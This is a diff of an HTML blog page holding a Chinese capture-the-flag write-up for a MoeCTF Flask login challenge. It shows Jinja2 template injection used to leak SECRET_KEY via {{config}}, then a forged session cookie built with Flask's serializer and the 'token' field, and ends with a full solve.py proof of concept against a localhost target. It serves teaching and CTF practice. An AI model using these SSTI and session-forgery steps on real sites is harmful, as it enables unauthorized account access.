@@ -87,22 +87,17 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="用户管理系统"><a href="#用户管理系统" class="headerlink" title="用户管理系统"></a><em>用户管理系统</em></h2><blockquote>
-<p>：Flask &#x2F; Werkzeug 3.1.8 &#x2F; Python 3.11.15<br><strong>Flag</strong><br><code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
-<p><strong>考点</strong></p>
-<p>：Jinja2 SSTI、长度限制绕过思维、</p>
-<p><code></code></p>
-<p> 密钥泄露、Flask session cookie 伪造（itsdangerous）、鉴权字段枚举</p>
-</blockquote>
-<hr>
-<h2 id="一、题目概述"><a href="#一、题目概述" class="headerlink" title="一、题目概述"></a>一、题目概述</h2><p>靶机是一个 Flask 编写的「用户管理系统」，只有一个登录页和一个鉴权接口。</p>
+        <h2 id="Moectf-bblogin"><a href="#Moectf-bblogin" class="headerlink" title="**Moectf bblogin"></a>**Moectf bblogin</h2><hr>
+<p> 一、题目概述</p>
+<p>靶机是一个 Flask 编写的「用户管理系统」，只有一个登录页和一个鉴权接口。</p>
 <ul>
 <li><code>GET /</code>：登录页（含 <code>username</code> &#x2F; <code>password</code> 表单，POST 到 <code>/login</code>）</li>
 <li><code>POST /login</code>：处理登录</li>
 <li><code>GET /user</code>：要求登录，未登录返回 <code>401 &#123;&quot;error&quot;:&quot;未登录&quot;&#125;</code><br>登录失败时后端会把 <code>username</code> 拼进模板并渲染，存在 ** Jinja2 服务端模板注入（SSTI）；同时 <code>username</code> 被限长 ** 10 字符**，逼着利用者走「短 payload 泄露密钥 → 伪造会话」而非直接 RCE</li>
 </ul>
 <hr>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br></pre></td></tr></table></figure>
+<p> 二、信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br></pre></td></tr></table></figure>
 
 <p>响应头确认技术栈：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.1.8 Python/3.11.15</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
@@ -112,22 +107,26 @@
 <li>页面标题「用户管理系统」，表单 <code>POST /login</code>，字段 <code>username</code>、<code>password</code></li>
 </ul>
 <hr>
-<h2 id="三、漏洞发现：SSTI-确认"><a href="#三、漏洞发现：SSTI-确认" class="headerlink" title="三、漏洞发现：SSTI 确认"></a>三、漏洞发现：SSTI 确认</h2><p>向 <code>/login</code> 提交 <code>username=49</code><br>响应错误提示：<br><code>49</code> 被求值成 <code>49</code> 并回显 → <strong>模板表达式可执行，SSTI 确认</strong>。模板结构大致为：</p>
+<p> 三、漏洞发现：SSTI 确认</p>
+<p>向 <code>/login</code> 提交 <code>username=49</code><br>响应错误提示：<br><code>49</code> 被求值成 <code>49</code> 并回显 → <strong>模板表达式可执行，SSTI 确认</strong>。模板结构大致为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(f&quot;用户&#123;username&#125;登录失败&quot;)</span><br></pre></td></tr></table></figure>
 
 <p>再注入 <code></code>，能直接看到 Flask 配置对象。</p>
 <hr>
-<h2 id="四、关键限制：username-限长-10-字符"><a href="#四、关键限制：username-限长-10-字符" class="headerlink" title="四、关键限制：username 限长 10 字符"></a>四、关键限制：username 限长 10 字符</h2><p>尝试注入更长的 RCE 链时，服务端返回：</p>
+<p> 四、关键限制：username 限长 10 字符</p>
+<p>尝试注入更长的 RCE 链时，服务端返回：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error&quot;&gt;&lt;p&gt;The username cannot be too long!&lt;/p&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这提示我们：** 不要硬刚 RCE，改走「短 payload 能做的二次利用」**</p>
 <hr>
-<h2 id="五、密钥泄露："><a href="#五、密钥泄露：" class="headerlink" title="五、密钥泄露："></a>五、密钥泄露：</h2><p><code></code> 恰好 10 字符，注入后完整返回 Flask 配置，其中关键一项：</p>
+<p> 五、密钥泄露：</p>
+<p><code></code> 恰好 10 字符，注入后完整返回 Flask 配置，其中关键一项：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br></pre></td></tr></table></figure>
 
 <p><code>SECRET_KEY</code> 是 Flask 签名会话 cookie 的密钥。拿到它，就能伪造任意合法 session </p>
 <hr>
-<h2 id="六、定位目标：路由枚举与鉴权分析"><a href="#六、定位目标：路由枚举与鉴权分析" class="headerlink" title="六、定位目标：路由枚举与鉴权分析"></a>六、定位目标：路由枚举与鉴权分析</h2><p>对所有可能路径做 fuzz：</p>
+<p> 六、定位目标：路由枚举与鉴权分析</p>
+<p>对所有可能路径做 fuzz：</p>
 <table>
 <thead>
 <tr>
@@ -161,7 +160,9 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="七、核心利用：伪造-Flask-session-cookie"><a href="#七、核心利用：伪造-Flask-session-cookie" class="headerlink" title="七、核心利用：伪造 Flask session cookie"></a>七、核心利用：伪造 Flask session cookie</h2><h3 id="7-1-会话-cookie-格式"><a href="#7-1-会话-cookie-格式" class="headerlink" title="7.1 会话 cookie 格式"></a>7.1 会话 cookie 格式</h3><p>Flask 的 session cookie 由 <code>itsdangerous</code> 的 <code>URLSafeTimedSerializer</code> 生成，结构为<strong>三段</strong>：</p>
+<p> 七、核心利用：伪造 Flask session cookie</p>
+<p> 会话 cookie 格式</p>
+<p>Flask 的 session cookie 由 <code>itsdangerous</code> 的 <code>URLSafeTimedSerializer</code> 生成，结构为<strong>三段</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlsafe_b64(payload)&gt;.&lt;timestamp_base36&gt;.&lt;signature&gt;</span><br></pre></td></tr></table></figure>
 
 <p>签名参数（Flask 默认）：</p>
@@ -170,9 +171,11 @@
 <li><code>key_derivation = &quot;hmac&quot;</code></li>
 <li><code>digest_method = sha1</code></li>
 </ul>
-<h3 id="7-2-用-SECRET-KEY-签名"><a href="#7-2-用-SECRET-KEY-签名" class="headerlink" title="7.2 用 SECRET_KEY 签名"></a>7.2 用 SECRET_KEY 签名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">print(cookie)</span><br><span class="line"># eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+<p> 用 SECRET_KEY 签名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">print(cookie)</span><br><span class="line"># eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
 
-<h3 id="7-3-鉴权字段枚举（本题最坑的点）"><a href="#7-3-鉴权字段枚举（本题最坑的点）" class="headerlink" title="7.3 鉴权字段枚举（本题最坑的点）"></a>7.3 鉴权字段枚举（本题最坑的点）</h3><p>伪造 cookie 打 <code>/user</code> 时，**字段名不是常见的<code>username</code>，而是<code>token</code><br>试过的常见结构全部 401：</p>
+<p> 鉴权字段枚举（本题最坑的点）</p>
+<p>伪造 cookie 打 <code>/user</code> 时，**字段名不是常见的<code>username</code>，而是<code>token</code><br>试过的常见结构全部 401：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;&#125;          # 401</span><br><span class="line">&#123;&quot;logged_in&quot;: True&#125;            # 401</span><br><span class="line">&#123;&quot;is_admin&quot;: True, ...&#125;        # 401</span><br><span class="line">&#123;&quot;user&quot;: &quot;admin&quot;&#125;              # 401</span><br></pre></td></tr></table></figure>
 
 <p>命中：</p>
@@ -180,16 +183,19 @@
 
 <p>这提醒我们：** 伪造会话时，字段名与值都要枚举，不能默认<code>username</code> **</p>
 <hr>
-<h2 id="八、Flag"><a href="#八、Flag" class="headerlink" title="八、Flag"></a>八、Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /user HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br><span class="line">Cookie: session=eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+<p> 八、Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /user HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br><span class="line">Cookie: session=eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><strong>Flag</strong> <code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
 <hr>
-<h2 id="九、完整可复现-PoC"><a href="#九、完整可复现-PoC" class="headerlink" title="九、完整可复现 PoC"></a>九、完整可复现 PoC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># solve.py</span><br><span class="line">import urllib.request</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">BASE = &quot;[http://127.0.0.1:7623](http://127.0.0.1:7623)&quot;</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line"># 1 泄露 SECRET_KEY</span><br><span class="line">#    POST /login  username=&#123;&#123;config&#125;&#125;</span><br><span class="line">#    SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br><span class="line"># 2 用 SECRET_KEY 伪造 session cookie</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line"># 3 带伪造 cookie 访问 /user</span><br><span class="line">req = urllib.request.Request(</span><br><span class="line">    BASE + &quot;/user&quot;,</span><br><span class="line">    headers=&#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;)</span><br><span class="line">r = urllib.request.urlopen(req, timeout=6)</span><br><span class="line">print(&quot;HTTP&quot;, r.status)</span><br><span class="line">print(r.read().decode(&quot;utf-8&quot;))</span><br><span class="line"># HTTP 200</span><br><span class="line"># &#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p> 九、完整可复现 PoC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># solve.py</span><br><span class="line">import urllib.request</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">BASE = &quot;[http://127.0.0.1:7623](http://127.0.0.1:7623)&quot;</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line"># 1 泄露 SECRET_KEY</span><br><span class="line">#    POST /login  username=&#123;&#123;config&#125;&#125;</span><br><span class="line">#    SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br><span class="line"># 2 用 SECRET_KEY 伪造 session cookie</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line"># 3 带伪造 cookie 访问 /user</span><br><span class="line">req = urllib.request.Request(</span><br><span class="line">    BASE + &quot;/user&quot;,</span><br><span class="line">    headers=&#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;)</span><br><span class="line">r = urllib.request.urlopen(req, timeout=6)</span><br><span class="line">print(&quot;HTTP&quot;, r.status)</span><br><span class="line">print(r.read().decode(&quot;utf-8&quot;))</span><br><span class="line"># HTTP 200</span><br><span class="line"># &#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="十、知识点与通用思路沉淀"><a href="#十、知识点与通用思路沉淀" class="headerlink" title="十、知识点与通用思路沉淀"></a>十、知识点与通用思路沉淀</h2><p><strong>SSTI 通用打法：</strong></p>
+<p> 十、知识点与通用思路</p>
+<p><strong>SSTI 通用打法：</strong></p>
 <ol>
 <li><strong>探测</strong>：7*7 求值回显 → 确认注入点。</li>
 <li><strong>看上下文</strong>：config,self,g,session,request </li>
